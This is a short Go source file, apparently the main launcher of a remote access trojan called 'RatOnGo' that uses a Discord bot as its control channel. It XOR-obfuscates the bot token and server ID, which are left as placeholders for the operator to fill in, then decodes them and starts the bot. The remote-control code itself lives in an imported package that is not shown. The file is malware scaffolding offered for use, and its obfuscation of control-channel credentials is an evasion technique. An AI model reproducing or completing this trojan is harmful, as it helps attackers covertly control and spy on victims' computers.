package main

import (
	"RatOnGo/discord"
)

var key byte = 0x5A

var encryptedToken = []byte{YOUR_ENCRYPTED_TOKEN_HERE}
var encryptedGuildID = []byte{YOUR_ENCRYPTED_GUILDID_HERE}

func xorDecrypt(data []byte, key byte) string {
	res := make([]byte, len(data))
	for i := range data {
		res[i] = data[i] ^ key
	}
	return string(res)
}

func main() {
	token := xorDecrypt(encryptedToken, key)
	guildID := xorDecrypt(encryptedGuildID, key)

	if token == "" || guildID == "" {
		return
	}

	discord.StartBot(token, guildID)
}
